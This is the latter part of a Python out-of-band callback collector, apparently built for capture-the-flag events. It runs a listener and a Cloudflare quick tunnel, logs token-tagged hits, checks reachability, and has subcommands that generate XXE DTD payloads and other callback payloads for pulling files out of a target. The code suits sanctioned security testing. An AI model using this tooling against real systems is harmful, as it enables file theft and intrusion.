def cmd_down(a) -> int:
    st = _read_json(state_path(), {})
    pid, cf = st.get("pid"), st.get("cf_pid")
    said = False
    if pid and _alive(pid):
        os.kill(int(pid), signal.SIGTERM)    # the listener stops its own cloudflared
        for _ in range(80):
            if not _alive(pid):
                break
            time.sleep(0.1)
        else:
            os.kill(int(pid), signal.SIGKILL)
        print(f"OOB DOWN pid={pid}")
        said = True
    if cf and _cf_alive(cf, st.get("port")):   # left behind by a listener that was killed
        try:
            os.kill(int(cf), signal.SIGTERM)
        except OSError:
            pass
        for _ in range(30):
            if not _cf_alive(cf, st.get("port")):
                break
            time.sleep(0.1)
        else:
            try:
                os.kill(int(cf), signal.SIGKILL)
            except OSError:
                pass
        print(f"OOB DOWN cloudflared pid={cf}")
        said = True
    if said and st.get("cf_pid"):
        st = _read_json(state_path(), {})
        st["cf_pid"] = None
        _write_json(state_path(), st)
    if not said:
        print("OOB down (nothing running)")
    return 0


def _count(day=None) -> int:
    try:
        with open(hits_path(day), encoding="utf-8") as fh:
            return sum(1 for _ in fh)
    except OSError:
        return 0


def cmd_status(a) -> int:
    st = running()
    fw = firewall_state()
    if st:
        print(f"OOB UP {shown_base(st)} tcp={st.get('tcp_port')} pid={st['pid']} "
              f"{max(0, int(st['until'] - time.time()))} s left; hits today {_count()}")
        if st.get("public_url"):
            print(f"public: quick tunnel {st['public_url']} -> {base_url(LOOPBACK, st['port'])} "
                  f"cloudflared pid={st.get('cf_pid')} ({'alive' if _cf_alive(st.get('cf_pid'), st['port']) else 'GONE'})")
    else:
        print(f"OOB DOWN; hits today {_count()}")
    if fw:
        print(f"firewall: {fw}")
    return 0 if st else 1


def cmd_addr(a) -> int:
    addr, notes = choose_address(interfaces(), a.bind)
    for n in notes:
        print(n, file=sys.stderr)
    print(addr)
    return 0


def _base(a) -> tuple:
    """(base URL, (tcp addr, port) or None) from --base, else the running listener."""
    if getattr(a, "base", None):
        m = re.fullmatch(r"http://([0-9.]+):(\d{1,5})/?", a.base)
        if not m and not is_public(a.base):
            raise Refused("--base takes http://<IPv4>:<port> or https://<name>.trycloudflare.com")
        return a.base.rstrip("/"), None
    st = running()
    if not st:
        raise Refused("the listener is not up: oob.py up first (or --base http://A:P to only print)")
    if st.get("public"):
        if not st.get("public_url"):
            raise Refused("the listener is up with --public but its quick tunnel has no URL: oob.py down, then up --public")
        return st["public_url"], None
    return base_url(st["bind"], st["port"]), ((st["bind"], st["tcp_port"]) if st.get("tcp_port") else None)


def cmd_selftest(a) -> int:
    st = running()
    if not st:
        print("SELFTEST FAIL: the listener is not up")
        return 1
    check_own_address(st.get("bind"))
    if st.get("public_url"):
        check_public(st["public_url"], "oob.py selftest (a probe of our own quick-tunnel URL)")
    tok = mint("selftest")
    before = _count()
    ok_http = ok_tcp = False
    try:
        with socket.create_connection((st["bind"], st["port"]), timeout=3) as s:
            s.sendall(f"GET /{tok}/selftest HTTP/1.0\r\nHost: {st['bind']}\r\nX-Oob-Selftest: 1\r\n\r\n".encode())
            ok_http = s.recv(256).startswith(b"HTTP/1.0 200")
    except OSError as e:
        print(f"http: {e}")
    if st.get("tcp_port"):
        try:
            with socket.create_connection((st["bind"], st["tcp_port"]), timeout=3) as s:
                s.sendall(f"selftest {tok}\n".encode())
            ok_tcp = True
        except OSError as e:
            print(f"tcp: {e}")
    want = 1 + (1 if st.get("tcp_port") else 0)
    for _ in range(30):
        rows = [r for r in read_hits(token=tok)]
        if len(rows) >= want:
            break
        time.sleep(0.1)
    good = ok_http and (ok_tcp or not st.get("tcp_port")) and len(rows) >= want and _count() > before
    pub = ""
    if st.get("public_url"):
        ok_pub, why = public_probe(st["public_url"], tok)
        prow = [r for r in read_hits(token=tok) if r.get("real_peer")]
        for _ in range(30):
            if prow or not ok_pub:
                break
            time.sleep(0.1)
            prow = [r for r in read_hits(token=tok) if r.get("real_peer")]
        good = good and ok_pub and bool(prow)
        pub = (f" public={'ok' if ok_pub and prow else 'no'}"
               + (f" real_peer={prow[0]['real_peer']}" if prow else "") + (f" ({why})" if why else ""))
    where = (f"via {st['public_url']} (our own request through Cloudflare; a target's route to it is not tested)"
             if st.get("public_url") else
             f"on {st['bind']} (local only: a target's route to this address is not tested)")
    print(f"SELFTEST {'PASS' if good else 'FAIL'} http={'ok' if ok_http else 'no'} "
          f"tcp={'ok' if ok_tcp else ('off' if not st.get('tcp_port') else 'no')} logged={len(rows)}/{want}"
          f"{pub} {where}")
    return 0 if good else 1


def public_probe(public_url, tok, patience=40.0) -> tuple:
    """(ok, why): one GET of our own public URL, tried again while a new quick tunnel's name is not yet in
    DNS (about 5 to 20 s after it is printed). Only our own URL, never a target's."""
    import http.client
    import ssl
    if not is_public(public_url):
        return False, "not a trycloudflare URL"
    host = public_url.split("://", 1)[1].rstrip("/")
    for h in (host, CF_API_HOST):        # the tunnel's own name, and the edge used when DNS lags
        check_public(h, "oob.py selftest (a probe of our own quick-tunnel URL)")

    class EdgeConnection(http.client.HTTPSConnection):
        """This Mac's resolver may hold a negative answer for a name asked before the tunnel registered it:
        connect to the Cloudflare edge that serves api.trycloudflare.com, with the tunnel's name as SNI and Host."""
        def connect(self):
            ip = socket.getaddrinfo("api.trycloudflare.com", 443, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
            raw = socket.create_connection((ip, 443), timeout=self.timeout)
            self.sock = ssl.create_default_context().wrap_socket(raw, server_hostname=host)

    end, why, edge = time.time() + patience, "", False
    while time.time() < end:
        try:
            conn = (EdgeConnection if edge else http.client.HTTPSConnection)(host, timeout=8)
            conn.request("GET", f"/{tok}/selftest-public", headers={"X-Oob-Selftest": "public"})
            resp = conn.getresponse()
            data = resp.read(64)
            conn.close()
            if resp.status == 200 and data.startswith(b"ok"):
                return True, ""
            why = f"http {resp.status}"
        except socket.gaierror as e:
            why = f"this Mac's resolver does not know {host} yet ({e}); trying through the Cloudflare edge"
            edge = True
        except (OSError, http.client.HTTPException) as e:
            why = type(e).__name__ + (f": {e}" if str(e) else "")
        time.sleep(2.0)
    return False, why[:160]


# ----------------------------------------------------------------------------------- reachability

SELFTEST_HEADER = "X-Oob-Selftest"
REACH_LABEL = "reach-probe"
REACH_EXIT = {"confirmed": 0, "unusable": 1, "plausible": 3, "unproven": 3}
FIRING = ("this probe sends nothing to any target: whether and how a callback is fired at a live target is "
          "the event's rules and the player's call")


def reach_path() -> Path:
    return home() / "reach.json"


def _header(row, name):
    for k, v in row.get("headers") or []:
        if str(k).lower() == name.lower():
            return str(v)
    return None


def hit_origin(row) -> str:
    """The address a hit came from: its real_peer (behind cloudflared), else the peer's host part."""
    if row.get("real_peer"):
        return str(row["real_peer"])
    peer = str(row.get("peer") or "")
    return peer.rsplit(":", 1)[0] if ":" in peer else peer


def target_callbacks(rows, own, since=None) -> list:
    """The hits that prove a target reached the listener: they carry a token this tool minted (an
    unattributed hit, such as a scanner on a public URL, proves nothing), are not this Mac's own
    checks (the X-Oob-Selftest header, a TCP `selftest` line, only `selftest` tokens), and come from
    an address that is neither loopback nor one of this Mac's (`own`). A tunnel hit without a
    real_peer has no known origin and is not counted. `since` (epoch) drops older hits."""
    out = []
    for r in rows:
        if since is not None and float(r.get("epoch") or 0) < float(since):
            continue
        if not r.get("tokens"):
            continue
        if _header(r, SELFTEST_HEADER) is not None:
            continue
        if r.get("kind") == "tcp" and str(r.get("body") or "").startswith("selftest "):
            continue
        labels = [str(x) for x in (r.get("labels") or [])]
        if labels and all(x == "selftest" for x in labels):
            continue
        origin = hit_origin(r)
        try:
            ip = ipaddress.ip_address(origin)
        except ValueError:
            continue
        if ip.is_loopback or ip.is_unspecified or origin in own:
            continue
        out.append(r)
    return out


def own_egress(rows) -> set:
    """This Mac's own public egress addresses, as its own checks showed them: the real_peer of a hit
    that carries the X-Oob-Selftest header (selftest's probe of our quick-tunnel URL arrives through
    cloudflared with this Mac's public address). A later hit from one of them is the player, not a
    target. A test hit the player makes by hand must carry the header too, or it counts as a target."""
    return {str(r["real_peer"]) for r in rows if r.get("real_peer") and _header(r, SELFTEST_HEADER) is not None}


def route_check(st, ifaces, ranges, target=None) -> tuple:
    """(status, why) for the route from a target back to the listener, judged from this Mac's side only
    (no packet is sent): "no" (it cannot work), "plausible" (it should, unproven) or "unknown"."""
    ranges = tuple(ranges or ())
    if st.get("public"):
        return ("plausible", f"public quick tunnel {st.get('public_url') or '(no URL yet)'}: a target needs outbound "
                "HTTPS to *.trycloudflare.com, which only a callback shows")
    bind = str(st.get("bind") or "")
    try:
        ip = ipaddress.ip_address(bind)
    except ValueError:
        return "no", f"the listener's bind {bind!r} is not an address"
    if ip.is_loopback:
        return "no", f"bound to loopback {bind}: no target can reach it"
    names = {a: i for i, a in ifaces}
    if not (ranges and names.get(bind, "").startswith("utun") and in_tunnel(bind, ranges)):
        why = "" if ranges else " (the event config declares no vpn_ranges)"
        return ("unknown", f"{bind} on {names.get(bind, 'an unlisted interface')} is not the event VPN tunnel{why}: "
                "whether a target routes to it is unknown")
    if target is None:
        return "plausible", f"{bind} is the event VPN tunnel ({', '.join(ranges)}); no --target named"
    try:
        ipaddress.ip_address(str(target))
    except ValueError:
        return ("unknown", f"--target {target!r} is a name; it is never resolved, so whether it sits in the VPN "
                "ranges is unknown (name its address)")
    if in_tunnel(target, ranges):
        return ("plausible", f"{bind} is the event VPN tunnel and {target} lies in its ranges: a route back is "
                "plausible, not proven (the VPN may drop target-to-player traffic)")
    return ("unknown", f"{target} lies outside the event VPN ranges ({', '.join(ranges)}): it reaches {bind} only "
            "if the event routes it")


def reachability(st, ifaces, ranges, rows, *, target=None, local=None, firewall="", event=None) -> dict:
    """The per-event reachability report (B-255): whether a target can reach the out-of-band listener.
    It never assumes: "confirmed" needs a callback from a target (target_callbacks) since this listener
    started, and from `target` itself when one is named (a callback from another address is listed,
    not counted); an address this Mac's own selftest arrived from (own_egress) is never a target;
    "plausible" is a listener that answers locally on a route that should work; "unproven"
    is one whose route is unknown; "unusable" is no listener, a failed local check or a loopback bind.
    `local` is (status, why) from local_answer(), or None when it was not run. Pure: no I/O."""
    checks = []

    def add(name, status, why):
        checks.append({"check": name, "status": status, "why": why})

    rep = {"event": event, "time": datetime.now().isoformat(timespec="seconds"), "target": target,
           "listener": None, "checks": checks, "callbacks": [], "earlier_callbacks": 0, "firing": FIRING}
    own = {a for _, a in ifaces} | {LOOPBACK} | own_egress(rows)
    if not st:
        add("listener", "no", "the listener is not up (oob.py up)")
        rep["earlier_callbacks"] = len(target_callbacks(rows, own))
        rep["verdict"], rep["usable"] = "unusable", False
        return rep
    base = shown_base(st)
    rep["listener"] = {"base": base, "bind": st.get("bind"), "port": st.get("port"), "tcp_port": st.get("tcp_port"),
                       "public": bool(st.get("public")), "started": st.get("started")}
    add("listener", "ok", f"up at {base}")
    lstat, lwhy = local if local is not None else ("unknown", "not run")
    add("local", lstat, lwhy)
    rstat, rwhy = route_check(st, ifaces, ranges, target)
    add("route", rstat, rwhy)
    if "enabled" in str(firewall or "").lower() and not st.get("public"):
        add("firewall", "unknown", f"macOS firewall: {firewall}; it may drop an inbound callback (selftest cannot see it)")
    since = st.get("started")
    cbs = target_callbacks(rows, own, since=since)
    rep["earlier_callbacks"] = len(target_callbacks(rows, own)) - len(cbs)
    for r in cbs:
        origin = hit_origin(r)
        rep["callbacks"].append({"time": r.get("time"), "kind": r.get("kind"), "origin": origin,
                                 "tokens": r.get("tokens"), "labels": r.get("labels"),
                                 "from_target": (origin == str(target)) if target else None})
    named = [c for c in rep["callbacks"] if c["from_target"]] if target else rep["callbacks"]
    if named:
        add("callback", "ok", f"{len(named)} callback(s) from {'the target ' + str(target) if target else 'a target'} "
            f"since this listener started (first from {named[0]['origin']})")
        verdict = "confirmed"
    else:
        if cbs:      # --target names the box to prove: a callback from another address does not prove it
            others = sorted({c["origin"] for c in rep["callbacks"]})
            add("callback", "unknown", f"{len(cbs)} callback(s) since this listener started, none from the target "
                f"{target} (from {', '.join(others[:5])}): a target that calls back from another egress address is "
                "proven by oob.py reach without --target")
        else:
            add("callback", "unknown", "no callback from a target since this listener started")
        if rstat == "no" or lstat == "no":
            verdict = "unusable"
        elif rstat == "plausible" and lstat == "ok":
            verdict = "plausible"
        else:
            verdict = "unproven"
    rep["verdict"], rep["usable"] = verdict, verdict == "confirmed"
    return rep


def local_answer(st, tok, patience=3.0) -> tuple:
    """(status, why): one GET from this Mac to the listener's own address, marked X-Oob-Selftest so it is
    never counted as a target, and whether it was logged. Connects only to this Mac (check_own_address)."""
    addr = check_own_address(st.get("bind"))
    try:
        with socket.create_connection((addr, int(st["port"])), timeout=3) as s:
            s.sendall(f"GET /{tok}/reach-local HTTP/1.0\r\nHost: {addr}\r\n{SELFTEST_HEADER}: reach\r\n\r\n".encode())
            answered = s.recv(256).startswith(b"HTTP/1.0 200")
    except OSError as e:
        return "no", f"the listener does not answer on {addr}:{st.get('port')} ({type(e).__name__}: {e})"
    if not answered:
        return "no", f"the listener on {addr}:{st.get('port')} did not answer 200"
    end = time.monotonic() + patience
    while True:
        if any(_header(r, SELFTEST_HEADER) == "reach" for r in read_hits(token=tok)):
            return "ok", f"answers and logs on {addr}:{st.get('port')} (local only)"
        if time.monotonic() >= end:
            return "no", f"the listener answered on {addr}:{st.get('port')} but logged nothing"
        time.sleep(0.1)


def _event_slug() -> tuple:
    """(slug, None) of the active event, or (None, why) when none resolves (the report says so)."""
    try:
        from ctf import event as ctf_event
        return ctf_event.current().slug, None
    except Exception as e:   # noqa: BLE001 - EventError or an unreadable profile: named in the report
        return None, f"{type(e).__name__}: {e}"


def reach_token(event) -> str:
    """The event's reach-probe token, minted once and reused (its label names the event)."""
    label = f"{REACH_LABEL} {event or 'no-event'}"
    toks = _read_json(tokens_path(), {})
    for t, meta in sorted(toks.items()):
        if TOKEN.fullmatch(t) and (meta or {}).get("label") == label:
            return t
    return mint(label)


def reach_report() -> dict:
    """The last saved reachability report of this event's workdir; Refused when none was made."""
    p = reach_path()
    if not p.is_file():
        raise Refused(f"no reachability report at {p}: run oob.py reach first")
    rep = _read_json(p, None)
    if not isinstance(rep, dict) or rep.get("verdict") not in REACH_EXIT:
        raise Refused(f"the reachability report at {p} is unreadable: run oob.py reach again")
    return rep


def show_reach(rep) -> str:
    lines = [f"REACH {rep['verdict'].upper()} event={rep.get('event') or '(none)'}"
             + (f" target={rep['target']}" if rep.get("target") else "")]
    if rep.get("event_note"):
        lines.append(f"  event: {rep['event_note']}")
    for c in rep["checks"]:
        lines.append(f"  {c['check']:<9} {c['status']:<9} {c['why']}")
    for c in rep["callbacks"][:10]:
        lines.append(f"  callback {c['time']} {c['kind']} from {c['origin']} {c.get('labels') or ''}")
    if rep.get("earlier_callbacks"):
        lines.append(f"  ({rep['earlier_callbacks']} callback(s) reached an earlier listener: they do not prove this one)")
    if rep.get("probe_url") and rep["verdict"] != "confirmed":
        lines.append(f"  to prove it: a callback to {rep['probe_url']} from the target (an SSRF fetch field, a "
                     "webhook) through a vector the event allows, then oob.py reach --wait 60 (a test hit you "
                     f"send yourself must carry the {SELFTEST_HEADER} header, or it counts as a target)")
    lines.append(f"  {rep['firing']}")
    return "\n".join(_clean(x) for x in lines)


def cmd_reach(a) -> int:
    st = running()
    ifaces = interfaces()
    ranges = event_ranges()
    event, note = _event_slug()
    tok = local = None
    if st:
        tok = reach_token(event)
        local = local_answer(st, tok)
    tail = HitTail(every=True)
    rows = tail.read()

    def build():
        rep = reachability(st, ifaces, ranges, rows, target=a.target, local=local, firewall=firewall_state(),
                           event=event)
        rep["event_note"] = note
        rep["token"] = tok
        rep["probe_url"] = build_url(shown_base(st), tok, "reach") if st else None
        return rep

    rep = build()
    wait = min(max(0.0, float(a.wait or 0)), FOLLOW_MAX)
    if wait and rep["verdict"] in ("plausible", "unproven"):
        if not a.json:
            print(f"waiting up to {wait:g} s for a target callback to {rep['probe_url']} ...", flush=True)
        end = time.time() + wait
        while time.time() < end:
            time.sleep(0.5)
            new = tail.read()
            if new:
                rows.extend(new)
                rep = build()
                if rep["verdict"] == "confirmed":
                    break
    _write_json(reach_path(), rep)
    print(json.dumps(rep, ensure_ascii=False, sort_keys=True) if a.json else show_reach(rep))
    return REACH_EXIT[rep["verdict"]]


class HitTail:
    """Reads hits.jsonl rows exactly once each, by byte offset (B-255).

    `hits --follow` used to print one read and then take its "already seen" count from a second read,
    so a hit logged between the two was counted and never printed; and the count was today's line
    count, so a follow that crossed midnight compared the new day's file with the old day's count.
    One tail fixes both: each read() returns the complete lines appended since the last read, from
    every file it watches (every day's with `every`, else today's plus any day file it already
    watched, so the next day's file is picked up from its first byte). A trailing line without its
    newline (a write still in progress) is left for the next read; a file that shrank (replaced) is
    read again from its start."""

    def __init__(self, every=False):
        self.every = bool(every)
        self.offsets = {}

    def _files(self) -> list:
        if self.every:
            return sorted(home().glob("*/hits.jsonl"))
        files = set(self.offsets) | {hits_path()}
        return sorted(files)

    def read(self) -> list:
        rows = []
        for f in self._files():
            off = self.offsets.get(f, 0)
            try:
                with open(f, "rb") as fh:
                    size = os.fstat(fh.fileno()).st_size
                    if size < off:
                        off = 0
                    fh.seek(off)
                    data = fh.read()
            except OSError:
                continue
            end = data.rfind(b"\n")
            if end < 0:
                self.offsets[f] = off
                continue
            self.offsets[f] = off + end + 1
            for ln in data[:end].split(b"\n"):
                try:
                    r = json.loads(ln.decode("utf-8"))
                except (ValueError, UnicodeDecodeError):
                    continue
                if isinstance(r, dict):
                    rows.append(r)
        return rows


def read_hits(token=None, every=False) -> list:
    return [r for r in HitTail(every).read() if not token or token in (r.get("tokens") or [])]


_CTRL = re.compile(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]")


def _clean(v) -> str:
    """Escape control bytes: header and body text is the target's, and may hold terminal escapes."""
    return _CTRL.sub(lambda m: f"\\x{ord(m.group()):02x}", str(v))


def show(r) -> str:
    return "\n".join(_clean(x) for x in _show_lines(r))


def _show_lines(r) -> list:
    head = f"{r.get('time')} {r.get('kind')} {r.get('peer')}"
    if r.get("real_peer"):
        head += f" (via cloudflared from {r['real_peer']})"
    if r.get("kind") == "raw":
        head += f" (not HTTP; error {r.get('error')})"
    if r.get("kind") == "http":
        head += f" {r.get('method')} {r.get('path')}"
    if r.get("tokens"):
        head += "  [" + ", ".join(f"{t}={l}" for t, l in zip(r["tokens"], r.get("labels") or [])) + "]"
    lines = [head]
    for k, v in r.get("headers") or []:
        lines.append(f"  {k}: {v}")
    body = r.get("body")
    if body is None and r.get("body_b64"):
        body = "(base64) " + r["body_b64"]
    if body:
        lines.append(f"  body ({r.get('body_len')} bytes{', TRUNCATED' if r.get('truncated') else ''}):")
        lines.extend("    " + x for x in body.splitlines()[:200])
    return lines


def cmd_hits(a) -> int:
    if a.token:
        check_token(a.token)
    # One tail for the first print and the follow (B-255): what was printed and what counts as seen
    # come from the same read, so a hit logged while the first batch prints is printed by the follow.
    tail = HitTail(a.all)

    def mine(batch):
        return [r for r in batch if not a.token or a.token in (r.get("tokens") or [])]

    rows = mine(tail.read())
    for r in rows:
        print(json.dumps(r, ensure_ascii=False) if a.json else show(r), flush=True)
    end = time.time() + min(max(0.0, float(a.follow or 0)), FOLLOW_MAX)
    while time.time() < end:
        time.sleep(0.5)
        for r in mine(tail.read()):
            print(json.dumps(r, ensure_ascii=False) if a.json else show(r), flush=True)
    if not rows and not a.follow:
        print("no hits" + (f" for {a.token}" if a.token else ""))
    return 0


def cmd_token(a) -> int:
    print(mint(" ".join(a.label)))
    return 0


def cmd_url(a) -> int:
    base, _ = _base(a)
    print(build_url(base, a.token, a.path or ""))
    return 0


def cmd_dtd(a) -> int:
    base, _ = _base(a)
    dtd, payload = build_dtd(base, a.token, a.file, php=a.php)
    serve_dir().mkdir(parents=True, exist_ok=True)
    out = serve_dir() / f"{a.token}.dtd"
    out.write_text(dtd)
    print(f"# DTD written to {out} (served at {base}/f/{a.token}.dtd):")
    print(dtd.rstrip())
    print("# XML payload (send as the request body the target parses):")
    print(payload)
    print(f"# then: oob.py hits --token {a.token} --follow 60   (the file comes back in the path's d= value)")
    return 0


def cmd_payloads(a) -> int:
    base, tcp = _base(a)
    check_token(a.token)
    last = None
    for cls, label, text in build_payloads(base, a.token, tcp):
        if cls != last:
            print(f"## {cls}")
            last = cls
        print(f"# {label}\n{text}")
    print(f"# watch: oob.py hits --token {a.token} --follow 120")
    return 0


def main(argv=None) -> int:
    p = argparse.ArgumentParser(prog="oob.py", description="out-of-band collector for the assigned target")
    sub = p.add_subparsers(dest="cmd", required=True)
    s = sub.add_parser("addr"); s.add_argument("--bind")
    s = sub.add_parser("up"); s.add_argument("--bind"); s.add_argument("--port", type=int, default=HTTP_PORT)
    s.add_argument("--tcp-port", type=int, default=TCP_PORT); s.add_argument("--minutes", type=int, default=MINUTES)
    s.add_argument("--public", action="store_true")
    sub.add_parser("down"); sub.add_parser("status"); sub.add_parser("selftest")
    s = sub.add_parser("token"); s.add_argument("label", nargs="+")
    s = sub.add_parser("url"); s.add_argument("token"); s.add_argument("path", nargs="?"); s.add_argument("--base")
    s = sub.add_parser("hits"); s.add_argument("--token"); s.add_argument("--follow", type=float, default=0)
    s.add_argument("--json", action="store_true"); s.add_argument("--all", action="store_true")
    s = sub.add_parser("dtd"); s.add_argument("token"); s.add_argument("file"); s.add_argument("--php", action="store_true")
    s.add_argument("--base")
    s = sub.add_parser("payloads"); s.add_argument("token"); s.add_argument("--base")
    s = sub.add_parser("reach"); s.add_argument("--target"); s.add_argument("--wait", type=float, default=0)
    s.add_argument("--json", action="store_true")
    s = sub.add_parser("_serve"); s.add_argument("--bind", required=True); s.add_argument("--port", type=int)
    s.add_argument("--tcp-port", type=int); s.add_argument("--until", type=float)
    s.add_argument("--public", action="store_true")
    a = p.parse_args(argv)
    try:
        if a.cmd == "_serve":
            # Re-check the address in the child too: it binds only what choose_address allows.
            addr, _ = choose_address(interfaces(), a.bind)
            if a.public:
                check_public(CF_API_HOST, "oob.py up --public (a cloudflared quick tunnel)")
            serve(addr, a.port, a.tcp_port if a.tcp_port else None, min(a.until, time.time() + MAX_MINUTES * 60),
                  public=a.public)
            return 0
        return {"addr": cmd_addr, "up": cmd_up, "down": cmd_down, "status": cmd_status, "selftest": cmd_selftest,
                "token": cmd_token, "url": cmd_url, "hits": cmd_hits, "dtd": cmd_dtd,
                "payloads": cmd_payloads, "reach": cmd_reach}[a.cmd](a)
    except Refused as e:
        print(str(e), file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
